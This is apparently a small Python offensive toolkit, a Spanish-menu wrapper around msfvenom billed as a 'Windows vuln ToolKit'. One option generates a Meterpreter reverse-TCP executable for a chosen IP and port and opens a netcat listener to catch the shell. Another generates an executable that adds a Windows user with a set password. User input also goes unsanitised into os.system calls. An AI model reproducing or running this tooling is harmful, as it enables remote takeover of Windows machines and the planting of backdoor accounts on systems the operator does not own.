from colorama import Fore, Back
import os, socket, sys

ip = socket.gethostname()
name = socket.gethostbyname(ip)

BLACK = '\033[30m'
RED = '\033[31m'
GREEN = '\033[32m'
YELLOW = '\033[33m'
BLUE = '\033[34m'
MAGENTA = '\033[35m'
CYAN = '\033[36m'
WHITE = '\033[37m'
RESET = '\033[39m'

def msf_windows():
    os.system('clear')
    title = '''
\033[31m ██▓███   ▄▄▄     ▓██   ██▓\033[34m ██▓     ▒█████   ▄▄▄      ▓█████▄ 
\033[31m▓██░  ██▒▒████▄    ▒██  ██▒\033[34m▓██▒    ▒██▒  ██▒▒████▄    ▒██▀ ██▌
\033[31m▓██░ ██▓▒▒██  ▀█▄   ▒██ ██░\033[34m▒██░    ▒██░  ██▒▒██  ▀█▄  ░██   █▌
\033[31m▒██▄█▓▒ ▒░██▄▄▄▄██  ░ ▐██▓░\033[34m▒██░    ▒██   ██░░██▄▄▄▄██ ░▓█▄   ▌
\033[31m▒██▒ ░  ░ ▓█   ▓██▒ ░ ██▒▓░\033[34m░██████▒░ ████▓▒░ ▓█   ▓██▒░▒████▓ 
\033[31m▒▓▒░ ░  ░ ▒▒   ▓▒█░  ██▒▒▒ \033[34m░ ▒░▓  ░░ ▒░▒░▒░  ▒▒   ▓▒█░ ▒▒▓  ▒ 
\033[31m░▒ ░       ▒   ▒▒ ░▓██ ░▒░ \033[34m░ ░ ▒  ░  ░ ▒ ▒░   ▒   ▒▒ ░ ░ ▒  ▒ 
\033[31m░░         ░   ▒   ▒ ▒ ░░  \033[34m  ░ ░   ░ ░ ░ ▒    ░   ▒    ░ ░  ░ 
\033[31m               ░  ░░ ░     \033[34m    ░  ░    ░ ░        ░  ░   ░    
\033[31m                   ░ ░     \033[34m                            ░     
'''
    print(title)
    print(Fore.BLUE + Back.RESET + '[#] Ingresa la tu IP.')
    ip = input(Fore.RED + Back.RESET + f'[{name}] -->  ')

    print(Fore.BLUE + Back.RESET + '\n[#] Ingresa el puerto.')
    port = input(Fore.RED + Back.RESET + f'[{name}] -->  ')

    print(Fore.BLUE + Back.RESET + '[#] Generando...')
    print('[#]> ---------------------------------------------------------------------------- <[#]')
    os.system(f'msfvenom -p windows/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f exe > windows.exe')
    print('[#]> ---------------------------------------------------------------------------- <[#]')
    os.system(f'nc -lvnp {port}')

def msf_user():
    os.system('clear')
    title = '''
\033[31m ███▄ ▄███▓  ██████   █████\033[34m▒█    ██   ██████ ▓█████  ██▀███  
\033[31m▓██▒▀█▀ ██▒▒██    ▒ ▓██   ▒\033[34m ██  ▓██▒▒██    ▒ ▓█   ▀ ▓██ ▒ ██▒
\033[31m▓██    ▓██░░ ▓██▄   ▒████ ░\033[34m▓██  ▒██░░ ▓██▄   ▒███   ▓██ ░▄█ ▒
\033[31m▒██    ▒██   ▒   ██▒░▓█▒  ░\033[34m▓▓█  ░██░  ▒   ██▒▒▓█  ▄ ▒██▀▀█▄  
\033[31m▒██▒   ░██▒▒██████▒▒░▒█░   \033[34m▒▒█████▓ ▒██████▒▒░▒████▒░██▓ ▒██▒
\033[31m░ ▒░   ░  ░▒ ▒▓▒ ▒ ░ ▒ ░   \033[34m░▒▓▒ ▒ ▒ ▒ ▒▓▒ ▒ ░░░ ▒░ ░░ ▒▓ ░▒▓░
\033[31m░  ░      ░░ ░▒  ░ ░ ░     \033[34m░░▒░ ░ ░ ░ ░▒  ░ ░ ░ ░  ░  ░▒ ░ ▒░
\033[31m░      ░   ░  ░  ░   ░ ░   \033[34m ░░░ ░ ░ ░  ░  ░     ░     ░░   ░ 
\033[31m       ░         ░         \033[34m   ░           ░     ░  ░   ░     
'''
    print(title)

    print(Fore.BLUE + Back.RESET + '[#] Ingresa el nombre de usuario a añadir.')
    user = input(Fore.RED + Back.RESET + f'[{name}] -->  ')

    print(Fore.BLUE + Back.RESET + '\n[#] Ingresa la contraseña de dicho usuario.')
    password = input(Fore.RED + Back.RESET + f'[{name}] -->  ')

    print(Fore.BLUE + Back.RESET + '[#] Generando...')
    print('[#]> ---------------------------------------------------------------------------- <[#]')
    os.system(f'msfvenom -p windows/adduser USER={user} PASS={password} -f exe > adduser.exe')
    print('[#]> ---------------------------------------------------------------------------- <[#]')
    print(Fore.BLUE + Back.RESET + 'Presiona ENTER para volver al menú.')
    choice = input(Fore.RED + Back.RESET + f'[{name}] -->  ')
    menu()


def menu():
    os.system('clear')
    title = '''
    \033[31m                                  --:==*.                                                   
    \033[31m                                   -:--+-=-+.                                               
    \033[31m                                   .-----:-#=#+#                                            
    \033[31m+-                                 =---#--#+*%@%##%%%%%#%##%%%#%##*.                        
    \033[31m===+#                             ---**##%%##*#%*#**+##*##***##***#####%##.                 
    \033[31m --==+*#                        -#%%####**#*=*+=+=+=#=#+=++=*=%++*+#+#*##*##%%*             
    \033[31m  -===++**##           -=+*%%*#***++*+=#--*----#----+-%-+=:#-*=:#+**-*-%+%%%%%%@@%*         
    \033[31m   -=++++*+**##%%%%##**#=++#-=:=-.....-..:.:..:..:.+.::.=.::.-.-:-.-=-+*..:::==-@@@@#%.     
    \033[31m   -=+++*#*-+-=:.:.:-:.-::.-.-.-.-..:..=:.....::....=...-=.--.:=-:==*=...-*+=+@:@@*%%%#%=  
    \033[31m     =*++**++====+===--:::-=:::=-:..=:.=:.:.:.::.:.-:.::.---:===:-+*:*..::-*::+%-@%#*--==%#*
    \033[31m     -*++*-+++====------=--==------=+=-=:=---:=::.::::---:=-====-++*++-...=:::-:::*:.:+=+%%.
    \033[31m    .==*+*-*==-::..  ..::::-:----+=:--===-=-:-::::::::-::---=+==+=+=-+:=::+-==.:-...+-#=-.  
    \033[31m   .++++**###.             ---::---------=----:-::-::-:-==-==+====--=-=.:=+-==--:::----.    
    \033[31m  .++=***#*                  :---::::------------:-----------=++****-:--:.::-::-:::::       
    \033[31m .=*++***                     :----:::::::--------------:----=-:=---:::..:.:-::::.          
    \033[31m ==****                        ----==+-  ..:::::::-::::::::::-::::::::::::::                
    \033[31m+++*=                         .--=--:              ...::----==-:::::.                       
    \033[31m+*.                           ----:                     =+++*+                              
    \033[31m                             .-:.                     .====+                                
    \033[31m                                                      --=.                                  
    \033[31m                                                    ..                 

    \033[34m[!] Windows vuln ToolKit by ZombieGeek0 2024.
    '''
    print(title)

    options = '''
    [00]: Salir.
    [01]: Volver al menú.
    [02]: Generar payload con msfvenom para Windows.
    [03]: Añadir usuario en Windows con msfvenom.
    '''
    print(Fore.BLUE + Back.RESET + options)

    choice = input(Fore.RED + Back.RESET + f'[{name}] -->  ')

    if choice == '00':
        os.system('clear')
        print(Fore.RESET + Back.RESET)
        sys.exit()

    elif choice == '01':
        menu()

    elif choice == '02':
        msf_windows()

    elif choice == '03':
        msf_user()

    else:
        print(Fore.BLUE + Back.RESET + '\n[#] Error: Command not found. Presiona ENTER para volver al menú.')
        choice = input(Fore.RED + Back.RESET + f'[{name}] -->  ')
        menu()

menu()
